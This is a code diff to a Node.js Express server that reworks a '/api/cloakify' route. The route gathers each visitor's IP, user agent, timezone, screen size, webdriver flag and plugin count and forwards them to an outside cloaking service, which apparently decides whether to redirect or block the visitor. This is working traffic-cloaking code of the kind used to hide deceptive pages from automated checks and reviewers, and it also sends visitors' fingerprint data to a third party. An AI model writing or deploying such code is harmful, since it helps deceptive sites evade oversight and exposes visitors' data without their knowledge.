@@ -20,29 +20,60 @@ app.get('/peacock', function(req, res) {
 
 // /api/cloakify — server-side proxy to avoid CORS issues
 app.post('/api/cloakify', function(req, res) {
-  var body = '';
-  req.on('data', function(chunk) { body += chunk; });
+  var chunks = [];
+  req.on('data', function(chunk) { chunks.push(chunk); });
   req.on('end', function() {
+    var body = Buffer.concat(chunks).toString();
+    var parsed = {};
+    try { parsed = JSON.parse(body); } catch(e) {}
+
+    var realIP = req.headers['x-forwarded-for']
+      ? req.headers['x-forwarded-for'].split(',')[0].trim()
+      : req.connection.remoteAddress;
+
+    var realUA = req.headers['user-agent'] || parsed.ua || '';
+
+    var payload = JSON.stringify({
+      ua: realUA,
+      tz: parsed.tz || '',
+      sw: parsed.sw || 0,
+      sh: parsed.sh || 0,
+      wd: parsed.wd || false,
+      pl: parsed.pl || 0,
+      mode: 'redirect'
+    });
+
+    var https = require('https');
     var options = {
       hostname: 'cloak.codingforfun.me',
       path: '/c/9360998c-9baa-46f1-ae8a-009b647d04e0',
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(body),
-        'X-Forwarded-For': req.headers['x-forwarded-for'] || req.connection.remoteAddress,
-        'User-Agent': req.headers['user-agent'] || ''
+        'Content-Length': Buffer.byteLength(payload),
+        'X-Forwarded-For': realIP,
+        'X-Real-IP': realIP,
+        'User-Agent': realUA
       }
     };
+
     var proxyReq = https.request(options, function(proxyRes) {
       var data = '';
       proxyRes.on('data', function(chunk) { data += chunk; });
-      proxyRes.on('end', function() { res.json(JSON.parse(data)); });
+      proxyRes.on('end', function() {
+        try {
+          res.json(JSON.parse(data));
+        } catch(e) {
+          res.json({ decision: 'block' });
+        }
+      });
     });
+
     proxyReq.on('error', function() {
       res.json({ decision: 'block' });
     });
-    proxyReq.write(body);
+
+    proxyReq.write(payload);
     proxyReq.end();
   });
 });
